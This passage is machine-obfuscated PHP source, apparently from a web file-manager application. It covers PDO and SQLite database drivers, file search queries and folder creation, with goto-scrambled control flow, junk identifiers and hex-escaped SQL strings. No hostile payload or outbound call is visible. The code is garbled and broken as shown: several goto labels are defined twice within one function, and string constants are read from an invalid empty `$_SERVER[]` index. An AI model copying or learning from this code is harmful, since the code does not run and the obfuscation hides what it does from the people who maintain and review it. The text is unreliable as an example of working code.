= $this->parseValue($d); if (is_scalar($Cՙ)) { $aϪ[] = $Cՙ; $D[] = $this->parseKey($Fͯ); } } $F돞 = $D䝐[800] . $this->parseTable($bƤ[$D䝐[263]]) . $D䝐[801] . implode($D䝐[47], $D) . $D䝐[802] . implode($D䝐[47], $aϪ) . $D䝐[803]; return $this->execute($F돞); } public function insertAll($A釳嚆, $cҎ = array(), $e = false) { goto A犍; A犍: $c՝Ȑ =& $_SERVER[]; if (!is_array($A釳嚆[0])) { return !1; } $aˉ = array_keys($A釳嚆[0]); goto Dޜ; Dޜ: $D = array(); foreach ($A釳嚆 as $D흛͑) { $Bސ = array(); foreach ($D흛͑ as $B̌ => $B̞) { $B̞ = $this->parseValue($B̞); if (is_scalar($B̞)) { $Bސ[] = $B̞; } } $D[] = $c՝Ȑ[244] . implode($c՝Ȑ[47], $Bސ) . $c՝Ȑ[803]; } array_walk($aˉ, array($this, $c՝Ȑ[804])); goto d; d: $A댶 = ($e ? $c՝Ȑ[805] : $c՝Ȑ[806]) . $c՝Ȑ[807] . $this->parseTable($cҎ[$c՝Ȑ[263]]) . $c՝Ȑ[801] . implode($c՝Ȑ[47], $aˉ) . $c՝Ȑ[808] . implode($c՝Ȑ[47], $D); return $this->execute($A댶); goto A; A: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $D =& $_SERVER[]; $this->error = $this->_linkID->errno . $D[4] . $this->_linkID->error; if ($D[33] != $this->queryStr) { $this->error .= LNG($D[45]) . $this->queryStr; } think_trace($this->error, $D[33], $D[46]); return $this->error; } public function escapeString($FÃ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($FÃ); } else { return addslashes($FÃ); } } public function parseKey(&$d󶬦, $d = true) { $C =& $_SERVER[]; if ($d) { $d󶬦 = $this->parseKeyCheck($d󶬦); } if ($d󶬦 != $C[172] && !preg_match($C[809], $d󶬦)) { $d󶬦 = $C[810] . trim($d󶬦, $C[810]) . $C[810]; } return $d󶬦; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($cԏ = '') { $b󝬓 =& $_SERVER[]; if (!class_exists($b󝬓[812])) { think_exception(think_lang($b󝬓[10]) . $b󝬓[813]); } if (!empty($cԏ)) { $this->config = $cԏ; if (empty($this->config[$b󝬓[13]])) { $this->config[$b󝬓[13]] = array(); } } } public function connect($f̯ = '', $aʔ = 0) { $F򮷔 =& $_SERVER[]; if (!isset($this->linkID[$aʔ])) { goto E׸; E׸: if (empty($f̯)) { $f̯ = $this->config; } if ($this->pconnect) { $f̯[$F򮷔[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$aʔ] = new PDO($f̯[$F򮷔[814]], $f̯[$F򮷔[787]], $f̯[$F򮷔[788]], $f̯[$F򮷔[13]]); } catch (PDOException $D􌅣׃) { think_exception($D􌅣׃->getMessage()); } goto CѴο; CѴο: $this->dbType = $this->_getDsnType($f̯[$F򮷔[814]]); if (in_array($this->dbType, array($F򮷔[815], $F򮷔[816], $F򮷔[817], $F򮷔[818]))) { think_exception($F򮷔[819] . $this->dbType . $F򮷔[820] . $this->dbType . $F򮷔[821]); } if (!$this->linkID[$aʔ]) { think_exception($F򮷔[822]); } goto A唋ǟ; A唋ǟ: $this->linkID[$aʔ]->exec($F򮷔[823] . think_config($F򮷔[790])); $this->connected = !0; if (1 != think_config($F򮷔[18])) { unset($this->config); } goto dĉ΂; dĉ΂: } return $this->linkID[$aʔ]; } public function free() { $this->PDOStatement = null; } public function query($f, $b = array()) { goto cԲ; c: if (!1 === $aÍ) { $this->error(); return !1; } else { return $this->getAll(); } goto e; aۣ: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $aÍ = $this->PDOStatement->execute($b); $this->debug(); goto c; C: think_action_status($b݃[19], 1); think_status($b݃[20]); $this->PDOStatement = $this->_linkID->prepare($f); goto aۣ; cԲ: $b݃ =& $_SERVER[]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto dىȟ; dىȟ: $this->queryStr = $f; if (!empty($b)) { $this->queryStr .= $b݃[824] . print_r($b, !0) . $b݃[825]; } if (!empty($this->PDOStatement)) { $this->free(); } goto C; e: } public function execute($c拸, $F셎̼ = array()) { goto EԆ; FԷ: think_status($c[20]); $this->PDOStatement = $this->_linkID->prepare($c拸); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto e֬Ԃ; Fո: if ($this->dbType == $c[818]) { if (preg_match($c[826], $this->queryStr, $d)) { $this->table = think_config($c[827]) . str_ireplace(think_config($c[828]), $c[357], $d[2]); $d⯨ = (bool) $this->query($c[829] . strtoupper($this->table) . $c[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($c[21], 1); goto FԷ; FȜ: $this->queryStr = $c拸; if (!empty($F셎̼)) { $this->queryStr .= $c[824] . print_r($F셎̼, !0) . $c[825]; } $d⯨ = !1; goto Fո; e֬Ԃ: $FƟ硽 = $this->PDOStatement->execute($F셎̼); $this->debug(); if (!1 === $FƟ硽) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($d⯨ || preg_match($c[830], $c拸)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto c܍ɺ; EԆ: $c =& $_SERVER[]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto FȜ; c܍ɺ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $d˚ = $this->_linkID->commit(); $this->transTimes = 0; if (!$d˚) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bƪ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bƪ) { $this->error(); return !1; } } return !0; } private function getAll() { $c稠 = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($c稠); return $c稠; } public function getFields($DԃҪ) { goto fМ; f䳮: $dǊ = $this->query($Dэ); $Dލ = array(); if ($dǊ) { foreach ($dǊ as $a҆ => $Eԕ) { $Eԕ = array_change_key_case($Eԕ); $Eԕ[$Cض[28]] = isset($Eԕ[$Cض[28]]) ? $Eԕ[$Cض[28]] : $Cض[357]; $Eԕ[$Cض[29]] = isset($Eԕ[$Cض[29]]) ? $Eԕ[$Cض[29]] : $Cض[357]; $b͌ӵ = isset($Eԕ[$Cض[257]]) ? $Eԕ[$Cض[257]] : $Eԕ[$Cض[28]]; $Dލ[$b͌ӵ] = array($Cض[28] => $b͌ӵ, $Cض[29] => $Eԕ[$Cض[29]], $Cض[31] => (bool) (isset($Eԕ[$Cض[99]]) && $Eԕ[$Cض[99]] === $Cض[33] || isset($Eԕ[$Cض[31]]) && $Eԕ[$Cض[31]] === $Cض[33]), $Cض[34] => isset($Eԕ[$Cض[34]]) ? $Eԕ[$Cض[34]] : (isset($Eԕ[$Cض[53]]) ? $Eԕ[$Cض[53]] : $Cض[357]), $Cض[36] => isset($Eԕ[$Cض[89]]) ? strtolower($Eԕ[$Cض[89]]) == $Cض[38] : (isset($Eԕ[$Cض[54]]) ? $Eԕ[$Cض[54]] : !1), $Cض[39] => isset($Eԕ[$Cض[847]]) ? strtolower($Eԕ[$Cض[847]]) == $Cض[41] : (isset($Eԕ[$Cض[89]]) ? $Eԕ[$Cض[89]] : !1)); } } goto fūσ; fūσ: return $Dލ; goto F; fМ: $Cض =& $_SERVER[]; $this->initConnect(!0); if (think_config($Cض[831])) { $Dэ = str_replace($Cض[832], $DԃҪ, think_config($Cض[831])); } else { switch ($this->dbType) { case $Cض[815]: case $Cض[833]: $Dэ = "\123\x45\x4c\105\103\124\40\40\x20\x63\157\154\x75\x6d\x6e\x5f\156\141\x6d\x65\40\141\x73\40\x27\x4e\141\x6d\145\x27\x2c\40\40\40\144\141\164\x61\x5f\164\171\160\145\40\141\x73\40\x27\x54\x79\160\145\47\54\40\x20\40\143\x6f\x6c\x75\155\x6e\x5f\144\x65\x66\x61\165\154\x74\40\141\x73\x20\47\x44\x65\x66\141\x75\154\x74\x27\x2c\40\40\40\151\x73\x5f\x6e\x75\x6c\x6c\141\x62\x6c\x65\40\141\163\40\47\x4e\x75\154\154\47\12\11\11\106\122\x4f\115\11\x69\x6e\x66\157\162\x6d\x61\x74\x69\x6f\156\137\163\x63\x68\x65\x6d\141\x2e\164\x61\x62\154\x65\x73\40\x41\x53\40\x74\xa\x9\x9\x4a\x4f\x49\x4e\11\151\156\146\x6f\x72\155\x61\164\x69\157\x6e\137\163\143\x68\145\x6d\141\x2e\x63\157\154\x75\155\156\x73\x20\101\x53\x20\x63\xa\11\x9\x4f\116\x20\x20\x74\x2e\x74\x61\x62\x6c\145\137\143\x61\164\141\154\x6f\x67\40\75\x20\x63\56\x74\141\x62\154\x65\x5f\x63\141\164\x61\154\157\x67\12\x9\11\x41\116\104\x20\x74\x2e\164\x61\142\154\145\137\x73\143\150\145\x6d\141\x20\x3d\x20\143\x2e\x74\141\142\x6c\x65\137\163\143\150\x65\x6d\141\xa\x9\x9\x41\116\x44\40\x74\56\x74\141\x62\x6c\145\x5f\156\x61\x6d\145\x20\x3d\x20\x63\56\x74\x61\142\x6c\x65\137\156\x61\x6d\145\xa\11\11\127\110\x45\x52\105\40\40\40\164\x2e\x74\141\x62\x6c\145\137\156\141\x6d\145\40\x3d\x20\x27{$DԃҪ}\47"; break; case $Cض[834]: $Dэ = $Cض[835] . $DԃҪ . $Cض[836]; break; case $Cض[816]: case $Cض[818]: $Dэ = $Cض[837] . $Cض[838] . $Cض[839] . strtoupper($DԃҪ) . $Cض[840] . strtoupper($DԃҪ) . $Cض[841]; break; case $Cض[842]: $Dэ = $Cض[843] . $DԃҪ . $Cض[844]; break; case $Cض[817]: break; case $Cض[845]: default: $Dэ = $Cض[846] . ($this->dbType == $Cض[845] ? "\140{$DԃҪ}\x60" : $DԃҪ); } } goto f䳮; F: } public function getTables($D˲ = '') { $eŵ׈ =& $_SERVER[]; if (think_config($eŵ׈[848])) { $C = str_replace($eŵ׈[849], $D˲, think_config($eŵ׈[848])); } else { switch ($this->dbType) { case $eŵ׈[816]: case $eŵ׈[818]: $C = $eŵ׈[850]; break; case $eŵ׈[815]: case $eŵ׈[833]: $C = $eŵ׈[851]; break; case $eŵ׈[842]: $C = $eŵ׈[852]; break; case $eŵ׈[817]: think_exception(think_lang($eŵ׈[853]) . $eŵ׈[854]); break; case $eŵ׈[834]: $C = $eŵ׈[42] . $eŵ׈[43] . $eŵ׈[44]; break; case $eŵ׈[845]: default: if (!empty($D˲)) { $C = $eŵ׈[798] . $D˲; } else { $C = $eŵ׈[799]; } } } $e = $this->query($C); $A閷 = array(); foreach ($e as $eԌۇ => $F͸) { $A閷[$eԌۇ] = current($F͸); } return $A閷; } protected function parseLimit($E) { $aҍ΃ =& $_SERVER[]; $B = $aҍ΃[33]; if (!empty($E)) { switch ($this->dbType) { case $aҍ΃[842]: case $aҍ΃[834]: $E = explode($aҍ΃[47], $E); if (count($E) > 1) { $B .= $aҍ΃[48] . $E[1] . $aҍ΃[49] . $E[0] . $aҍ΃[50]; } else { $B .= $aҍ΃[48] . $E[0] . $aҍ΃[50]; } break; case $aҍ΃[815]: case $aҍ΃[833]: break; case $aҍ΃[817]: break; case $aҍ΃[816]: case $aҍ΃[818]: break; case $aҍ΃[845]: default: $B .= $aҍ΃[48] . $E . $aҍ΃[50]; } } return $B; } public function parseKey(&$Bŋ, $f = true) { $dت =& $_SERVER[]; if ($f) { $Bŋ = $this->parseKeyCheck($Bŋ); } if ($this->dbType == $dت[845]) { if ($Bŋ != $dت[172] && !preg_match($dت[809], $Bŋ)) { $Bŋ = $dت[810] . trim($Bŋ, $dت[810]) . $dت[810]; } return $Bŋ; } else { return parent::parseKey($Bŋ); } } public function close() { $this->_linkID = null; } public function error() { $e쾞 =& $_SERVER[]; if ($this->PDOStatement) { $A = $this->PDOStatement->errorInfo(); $this->error = $A[1] . $e쾞[4] . $A[2]; } else { $this->error = $e쾞[33]; } if ($e쾞[33] != $this->queryStr) { $this->error .= LNG($e쾞[45]) . $this->queryStr; } think_trace($this->error, $e쾞[33], $e쾞[46]); return $this->error; } public function escapeString($E) { $D =& $_SERVER[]; switch ($this->dbType) { case $D[842]: case $D[815]: case $D[833]: case $D[845]: return addslashes($E); case $D[817]: case $D[834]: case $D[816]: case $D[818]: return str_ireplace($D[55], $D[56], $E); } } protected function parseValue($D) { $Aϝб =& $_SERVER[]; if (is_string($D)) { $D = strpos($D, $Aϝб[4]) === 0 ? $this->escapeString($D) : $Aϝб[855] . $this->escapeString($D) . $Aϝб[855]; } elseif (isset($D[0]) && is_string($D[0]) && strtolower($D[0]) == $Aϝб[281]) { $D = $this->escapeString($D[1]); } elseif (is_array($D)) { $D = array_map(array($this, $Aϝб[856]), $D); } elseif (is_bool($D)) { $D = $D ? $Aϝб[83] : $Aϝб[464]; } elseif (is_null($D)) { $D = $Aϝб[99]; } return $D; } public function getLastInsertId() { $E =& $_SERVER[]; switch ($this->dbType) { case $E[842]: case $E[834]: case $E[815]: case $E[833]: case $E[817]: case $E[845]: return $this->_linkID->lastInsertId(); case $E[816]: case $E[818]: $cނ = $this->table; $f殛 = $this->query("\123\x45\114\x45\103\124\x20{$cނ}\x2e\x63\165\162\x72\166\141\x6c\x20\143\165\x72\162\166\x61\154\40\106\122\x4f\x4d\40\x64\165\x61\154"); return $f殛 ? $f殛[0][$E[857]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($C⩆) { goto Bєԃ; CО쾺: if (!$c⣴) { return !1; } if (flock($c⣴, LOCK_EX)) { $fǧ = parent::query($C⩆); flock($c⣴, LOCK_UN); fclose($c⣴); return $fǧ; } flock($c⣴, LOCK_UN); goto B꛷Ӓ; B꛷Ӓ: fclose($c⣴); show_json($e[860], !1); return !1; goto E; Bєԃ: $e =& $_SERVER[]; $AĨ = DATA_PATH . $e[858]; $c⣴ = fopen($AĨ, $e[859]); goto CО쾺; E: } public function execute($Fݻ˝) { goto B˙; Eͅ: fclose($Fʷ); show_json($c̰[860], !1); return !1; goto B􄰿; B˙: $c̰ =& $_SERVER[]; $D = DATA_PATH . $c̰[858]; $Fʷ = fopen($D, $c̰[859]); goto e; e: if (!$Fʷ) { return !1; } if (flock($Fʷ, LOCK_EX)) { $D = parent::execute($Fݻ˝); flock($Fʷ, LOCK_UN); fclose($Fʷ); return $D; } flock($Fʷ, LOCK_UN); goto Eͅ; B􄰿: } } goto f㟷; C䃷Ѓ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($eݭ) { goto dϾԊ; fܸ: if (!$Cѫ垅) { return array(); } $Cư = $Cѫ垅[$Dˈה[156]]; $CĬǮ = $Dˈה[7]; goto Bš; dϾԊ: $Dˈה =& $_SERVER[]; $FͶ = KodIO::fileTypeList(); $Cѫ垅 = $FͶ[$eݭ]; goto fܸ; Bš: if (!$Cѫ垅[$Dˈה[156]]) { $E = array_to_keyvalue($FͶ, $Dˈה[33], $Dˈה[156]); $Cư = implode($Dˈה[47], $E); $CĬǮ = $Dˈה[2224]; } $bڝ = explode($Dˈה[47], trim($Cư, $Dˈה[47])); return array($CĬǮ, $bڝ); goto E; E: } public function listPathType($b郜ʘ) { $b =& $_SERVER[]; $eҴ = $this->fileTypeWhere($b郜ʘ); if (!$eҴ) { return array(); } $Aܕ = array($b[517] => SourceModel::TYPE_USER, $b[518] => USER_ID, $b[514] => 0, $b[515] => $eҴ); return $this->listSource($Aܕ); } public function listSearch($Aس, $aلѭ = 300) { goto d; D: $this->_listSearchDesc($Cʖ, $Aس, $C); $this->_listSearchTag($Cʖ, $Aس, $C); $this->_listDataApply($Cʖ[$a٫Ơ[350]]); goto aӢ; D: if (!isset($D[$a٫Ơ[393]])) { $D[$a٫Ơ[393]] = 0; } $B = $a٫Ơ[2275]; $C = $B; goto E؃ӯ; aӢ: $this->_listMake($Cʖ); return $Cʖ; goto E˨륿; E؃ӯ: $this->_listSearchBindPinyin($Aس, $D, $B); $this->alias($a٫Ơ[483])->_makeOrder()->cache(null, 10); $Cʖ = $this->distinct(!0)->field($B)->where($D)->selectPage($aلѭ); goto D; d: $a٫Ơ =& $_SERVER[]; if (isset($Aس[$a٫Ơ[2144]]) && $Aس[$a٫Ơ[2144]]) { $Aس[$a٫Ơ[2144]] = str_replace($a٫Ơ[1557], $a٫Ơ[2274], trim($Aس[$a٫Ơ[2144]])); } $D = $this->_parseSearchWhere($Aس); goto D; E˨륿: } private function _listSearchTag(&$e, $b, $D΃) { goto aܫ; Fԯ: if (!$Aˤ񽔼) { return; } $eе򵥊 = array($bۻ[389] => array($bۻ[7], $Aˤ񽔼)); $A߯څ = Model($bۻ[390])->field($bۻ[75])->where($eе򵥊)->select(); goto D뉷; aܫ: $bۻ =& $_SERVER[]; if (!$b[$bۻ[2144]] || $e[$bۻ[347]][$bۻ[336]] > 1) { return; } $D܋ = Model($bۻ[2276])->listData(); goto a콃; a콃: $Aˤ񽔼 = array(); $B = $b[$bۻ[2144]]; foreach ($D܋ as $fވ) { $bԄ = $fވ[$bۻ[28]]; $cë = str_replace($bۻ[50], $bۻ[33], Pinyin::encode($bԄ)); if (stripos($bԄ, $B) !== !1 || stripos($cë, $B) !== !1) { $Aˤ񽔼[] = $fވ[$bۻ[363]]; } } goto Fԯ; D뉷: $A߯څ = array_to_keyvalue($A߯څ, $bۻ[33], $bۻ[75]); $c續 = array_unique($A߯څ); $this->_listSearchMerge($e, $b, $D΃, $c續); goto dǑ; dǑ: } private function _listSearchDesc(&$E٢, $F, $fæ) { goto B޻; B޻: $a냇 =& $_SERVER[]; if (!$F[$a냇[2144]] || $E٢[$a냇[347]][$a냇[336]] > 1) { return; } $Fϕݹ = $this->listSearchChildren($F[$a냇[457]]); goto b; b: $Fϕݹ = array_unique($Fϕݹ); if (!$Fϕݹ) { return; } $a = array($a냇[365] => array($a냇[7], $Fϕݹ), $a냇[89] => $a냇[401], $a냇[355] => array($a냇[737], $a냇[2146] . $F[$a냇[2144]] . $a냇[2146])); goto aޛ; aޛ: $f = Model($a냇[500])->field($a냇[365])->where($a)->select(); $aŨ = array_to_keyvalue($f, $a냇[33], $a냇[365]); $this->_listSearchMerge($E٢, $F, $fæ, $aŨ); goto Bےݛ; Bےݛ: } private function _listSearchMerge(&$Cْя, $dꪯ, $fϣ, $fˣև) { goto Eޤ; eǎ: foreach ($E쫥 as $F) { $Bթ = $CŃ[47] . $dꪯ[$CŃ[457]] . $CŃ[47]; if (stripos($F[$CŃ[455]], $Bթ) !== !1) { $B哫[] = $F; } } $Cْя[$CŃ[350]] = array_merge($B哫, $Cْя[$CŃ[350]]); $Cْя[$CŃ[347]][$CŃ[348]] += count($B哫); goto d; C: $E쫥 = $this->field($fϣ)->where($e)->select(); if (!$E쫥) { return; } $B哫 = array(); goto eǎ; Eޤ: $CŃ =& $_SERVER[]; if (!$fˣև) { return; } $d = array_to_keyvalue($Cْя[$CŃ[350]], $CŃ[33], $CŃ[365]); goto Cؽ; Cؽ: $F˙ = array_diff($fˣև, $d); if (!$F˙) { return; } $e = array($CŃ[365] => array($CŃ[7], $F˙)); goto C; d: } public function listSearchChildren($D, $d؋ = 5000) { goto A; A: $fڏ = $this->field($a[365])->where($d咃)->select(); $Bȯ = array_to_keyvalue($fڏ, $a[33], $a[365]); return $Bȯ; goto c; A: $a =& $_SERVER[]; $Bȯ = array(); $BȎ = $this->sourceInfo($D); goto fѨӗ; fѨӗ: $d咃 = array($a[455] => array($a[737], $BȎ[$a[455]] . $BȎ[$a[365]] . $a[480])); $bٮ = $this->field($a[365])->cache(null, 600)->where($d咃)->count(); if ($bٮ > $d؋) { return $this->_listSearchChildrenNear($D, $d؋); } goto A; c: } private function _listSearchChildrenNear($c㩳, $cĥѳ) { goto EԦˏ; e: $cȜ = $this->field($b֍[2277])->where($c̪ɔ)->select(); $dӌ = array_to_keyvalue(array_filter_by_field($cȜ, $b֍[366], $b֍[83]), $b֍[33], $b֍[365]); $Eݯ = array_merge($Eݯ, array_to_keyvalue($cȜ, $b֍[33], $b֍[365])); goto A术; EԦˏ: $b֍ =& $_SERVER[]; $Eݯ = array(); $c̪ɔ = array($b֍[457] => $c㩳); goto e; c䋧: $Eݯ = array_merge($Eݯ, array_to_keyvalue($cȜ, $b֍[33], $b֍[365])); $Eݯ = array_slice($Eݯ, 0, $cĥѳ); return $Eݯ; goto fڢ; A术: if (!$dӌ) { return $Eݯ; } $c̪ɔ = array($b֍[457] => array($b֍[7], $dӌ)); $cȜ = $this->field($b֍[2277])->where($c̪ɔ)->select(); goto c䋧; fڢ: } private function _listSearchBindPinyin($b, &$F񿚿, &$B͛) { goto B߂Α; B߂Α: $eӷ =& $_SERVER[]; if (!Input::check($b[$eӷ[2144]], $eӷ[302]) || strlen($b[$eӷ[2144]]) < 2) { return; } $A = "\114\x45\106\124\40\x4a\117\111\116\x20{$this->tablePrefix}\151\x6f\x5f\163\x6f\x75\x72\x63\x65\x5f\155\x65\164\x61\x20\x6d\145\164\141\x20\x6f\x6e\40\163\157\165\162\143\x65\x2e\x73\x6f\x75\162\x63\145\111\x44\x20\x3d\x20\x6d\x65\164\141\x2e\x73\x6f\x75\x72\x63\x65\x49\104"; goto DԈ҅; fѕ: $c٠[] = array($eӷ[2281] => $bߏ, $eӷ[900] => $eӷ[2148], array($eӷ[2282] => $bߏ, $eӷ[2283] => array($eӷ[7], array($eӷ[412], $eӷ[411])))); $this->join($A); $F񿚿 = $c٠; goto Eނ; DԈ҅: $c٠ = array(); $B͛ = str_replace(array($eӷ[213], $eӷ[50], $eӷ[2278]), $eӷ[33], $B͛); $B͛ = $eӷ[2279] . str_replace($eӷ[47], $eӷ[2280], $B͛); goto dܙ; dܙ: unset($F񿚿[$eӷ[28]]); foreach ($F񿚿 as $F => $Fɯ) { $c٠[$eӷ[2279] . $F] = $Fɯ; } $bߏ = array($eӷ[479], $eӷ[2146] . $b[$eӷ[2144]] . $eӷ[2146]); goto fѕ; Eނ: } private function _parseSearchWhere($dڈ) { goto aԤ; F٣Ʈ: if (isset($dڈ[$aĨǾ[2144]]) && $dڈ[$aĨǾ[2144]]) { $cڝ̤ = $dڈ[$aĨǾ[2144]]; $EҲ󛭃 = explode($aĨǾ[50], $cڝ̤); if (strlen($cڝ̤) > 2 && (substr($cڝ̤, 0, 1) == $aĨǾ[112] && substr($cڝ̤, -1) == $aĨǾ[112]) || substr($cڝ̤, 0, 1) == $aĨǾ[55] && substr($cڝ̤, -1) == $aĨǾ[55]) { $cڝ̤ = substr($cڝ̤, 1, -1); $EҲ󛭃 = array($cڝ̤); } $B׏[$aĨǾ[28]] = array($aĨǾ[479], $aĨǾ[2146] . $cڝ̤ . $aĨǾ[2146]); if (count($EҲ󛭃) > 1) { $B׏[$aĨǾ[28]] = array(); foreach ($EҲ󛭃 as $a܏) { if (!trim($a܏)) { continue; } $B׏[$aĨǾ[28]][] = array($aĨǾ[479], $aĨǾ[2146] . trim($a܏) . $aĨǾ[2146]); } } } return $B׏; goto AϮ; a: if (isset($dڈ[$aĨǾ[531]])) { $B׏[] = array($aĨǾ[375] => $dڈ[$aĨǾ[531]], $aĨǾ[374] => $dڈ[$aĨǾ[531]], $aĨǾ[900] => $aĨǾ[2148]); } if (isset($dڈ[$aĨǾ[368]])) { $bȌߞ = $dڈ[$aĨǾ[368]]; if ($bȌߞ == $aĨǾ[76]) { $B׏[$aĨǾ[366]] = 1; } else { if ($bȌߞ == $aĨǾ[2289]) { $B׏[$aĨǾ[366]] = 0; } else { if ($bȌߞ) { $bȌߞ = is_array($bȌߞ) ? $bȌߞ : explode($aĨǾ[47], $bȌߞ); $B׏[$aĨǾ[368]] = array($aĨǾ[380], $bȌߞ); $B׏[$aĨǾ[366]] = 0; } } } } if (isset($dڈ[$aĨǾ[457]])) { $E = $this->sourceInfo($dڈ[$aĨǾ[457]]); $B׏[$aĨǾ[521]] = array($aĨǾ[479], $E[$aĨǾ[455]] . $dڈ[$aĨǾ[457]] . $aĨǾ[480]); } goto F٣Ʈ; aԤ: $aĨǾ =& $_SERVER[]; $B׏ = array(); if (isset($dڈ[$aĨǾ[688]])) { $B׏[$aĨǾ[106]] = array($aĨǾ[2284], $dڈ[$aĨǾ[688]]); } goto dˌ; dˌ: if (isset($dڈ[$aĨǾ[689]])) { $C۠ = array($aĨǾ[2285], $dڈ[$aĨǾ[689]]); if ($B׏[$aĨǾ[106]]) { $B׏[$aĨǾ[106]] = array($B׏[$aĨǾ[106]], $C۠, $aĨǾ[2286]); } else { $B׏[$aĨǾ[106]] = $C۠; } } if (isset($dڈ[$aĨǾ[2287]])) { $B׏[$aĨǾ[77]] = array($aĨǾ[2284], $dڈ[$aĨǾ[2287]]); } if (isset($dڈ[$aĨǾ[2288]])) { $C۠ = array($aĨǾ[2285], $dڈ[$aĨǾ[2288]]); if ($B׏[$aĨǾ[77]]) { $B׏[$aĨǾ[77]] = array($B׏[$aĨǾ[77]], $C۠, $aĨǾ[2286]); } else { $B׏[$aĨǾ[77]] = $C۠; } } goto a; AϮ: } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($B) { $dԂ =& $_SERVER[]; $E؅ = Model($dԂ[470])->where(array($dԂ[1397] => $B))->find(); $B = $this->_mkdirRoot(SourceModel::TYPE_USER, $B, $E؅[$dԂ[28]]); $this->userDesktopAdd($B); return $B; } public function userDesktopAdd($d) { $B =& $_SERVER[]; $d = LNG($B[2290]); $dӏծ = $this->mkdir($d, $d); $this->metaSet($dӏծ, $B[2291], $B[83]); $this->metaSet($d, $B[2292], $dӏծ); } public function groupRootAdd($E׳) { $Aԕ =& $_SERVER[]; $Dʅ = Model($Aԕ[454])->where(array($Aԕ[2140] => $E׳))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $E׳, $Dʅ[$Aԕ[28]]); } public function systemRootPathAdd($f§) { if ($f§ != $_SERVER[][1076]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $f§); } public function userRootRemove($c) { $CŪў = $this->sourceRoot(SourceModel::TYPE_USER, $c); if (!$CŪў) { return; } $this->remove($CŪў, !1); } public function groupRootRemove($e۲ޝ) { $E = $this->sourceRoot(SourceModel::TYPE_GROUP, $e۲ޝ); if (!$E) { return; } $this->remove($E, !1); } private function _mkdirRoot($aīˠ, $Cĵ, $aЄ) { goto e; A㋄: $f҈φ = "\115\x6f\144\145\x6c\x53\157\x75\162\x63\145\x2e\x6d\153\x64\151\162\x52\157\x6f\164\56{$aīˠ}\56{$Cĵ}\x2e" . $aЄ; CacheLock::lock($f҈φ); $c˛Ω[$a[28]] = $aЄ; goto Aڬم; Aڬم: $A噡 = $this->add($c˛Ω); $Aݵ = array($a[523] => short_id($A噡)); $this->where(array($a[379] => $A噡))->save($Aݵ); goto dңݾ۹; e: $a =& $_SERVER[]; $c˛Ω = array($a[364] => 0, $a[517] => $aīˠ, $a[518] => $Cĵ, $a[514] => 1, $a[519] => USER_ID, $a[520] => USER_ID, $a[515] => $a[33], $a[521] => $a[466], $a[392] => 0, $a[516] => 0, $a[416] => 0, $a[522] => $a[33]); if ($dػ = $this->where($c˛Ω)->find()) { return $dػ[$a[365]]; } goto A㋄; dңݾ۹: CacheLock::unlock($f҈φ); return $A噡; goto a̧; a̧: } private function sourceRoot($bܺ, $f, $b̼ = false) { $F̐ =& $_SERVER[]; $D䰒 = array($F̐[364] => 0, $F̐[517] => $bܺ, $F̐[518] => $f); if ($F = $this->where($D䰒)->find()) { return $b̼ ? $F : $F[$F̐[365]]; } return !1; } public function sourceRootGroup($Eɒܭ) { $eٱ =& $_SERVER[]; if (is_string($Eɒܭ)) { $Eɒܭ = array($Eɒܭ); } $cԂ = array($eٱ[364] => 0, $eٱ[517] => SourceModel::TYPE_GROUP, $eٱ[518] => array($eٱ[7], $Eɒܭ)); $d = $this->listSource($cԂ, 1000); return array_to_keyvalue($d[$eٱ[74]], $eٱ[452]); } public function mkfile($cߴ, $D捊, $c㾃٥Ȣ = '', $F؞ = REPEAT_RENAME) { $F܎ =& $_SERVER[]; $dϮ = Model($F܎[540])->addFileByContent($c㾃٥Ȣ, $D捊); return $this->_createFileCall($cߴ, $D捊, $dϮ, $F؞, $F܎[1105]); } public function addFile($fز, $bѱמ, $bұ, $Dэ = false, $c = REPEAT_RENAME) { $d = Model($_SERVER[][540])->addFile($bѱמ, $bұ, $Dэ); return $this->_createFileCall($fز, $bұ, $d, $c); } public function addFileByFileID($D, $c, $A給, $FӪ = REPEAT_RENAME) { $e؜ۭ =& $_SERVER[]; $b = Model($e؜ۭ[540])->find($c); Model($e؜ۭ[540])->linkAdd($c); return $this->_createFileCall($D, $A給, $b, $FӪ); } public function addFileByRemote($b, $fƒޯ, $dꃏ, $eڅ = array(), $dۗ = REPEAT_RENAME) { $B = Model($_SERVER[][540])->addFileByRemote($fƒޯ, $dꃏ, $eڅ); return $this->_createFileCall($b, $dꃏ, $B, $dۗ); } private function _createFileCall($Dݝ, $bꮊި, $A, $Cаʈ, $cۊ = "\x75\x70\154\157\x61\144") { goto cņ; cņ: $bԌ =& $_SERVER[]; $dƨ͚ = !1; $this->lockWriteStart($Dݝ, $bꮊި); goto aꕊ҅; Bàѽ: return $Cި; goto bۻ; aꕊ҅: $Cި = $this->_createFile($Dݝ, $bꮊި, $A, $Cаʈ, $dƨ͚); if (!$dƨ͚) { Model($bԌ[418])->remove($A[$bԌ[415]]); } else { if ($Cި) { Model($bԌ[2263])->eventCreate($Cި, $cۊ); } } $this->lockWriteEnd($Dݝ, $bꮊި); goto Bàѽ; bۻ: } public function mkdir($Ań, $EŲˉ, $F˖ = REPEAT_SKIP) { goto 